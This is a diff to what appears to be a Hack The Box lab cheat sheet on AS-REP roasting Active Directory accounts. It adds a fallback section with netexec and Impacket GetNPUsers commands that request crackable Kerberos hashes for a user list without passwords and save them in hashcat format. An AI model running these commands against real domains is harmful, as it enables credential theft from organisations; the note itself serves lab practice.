@@ -37,3 +37,12 @@ $krb5asrep$23$username@HTB.LOCAL:a3f1...HASH...c2d9
 
 > [!warning] 💡
 > GetNPUsers can succeed without a clear success line. Always inspect `$BoxDir/loot/asrep.txt`.
+
+## LDAP and package fallbacks
+
+If LDAPS times out, force LDAP on port 389. If the local Impacket wrapper fails because of a Python package conflict, use the pipx installation.
+
+```bash
+netexec ldap $BoxIP --port 389 -u $BoxDir/loot/users.txt -p '' --asreproast $BoxDir/loot/asrep.txt
+/home/kali/.local/share/pipx/venvs/impacket/bin/GetNPUsers.py $Domain/ -dc-ip $BoxIP -usersfile $BoxDir/loot/users.txt -no-pass -request -format hashcat -outputfile $BoxDir/loot/asrep.txt
+```
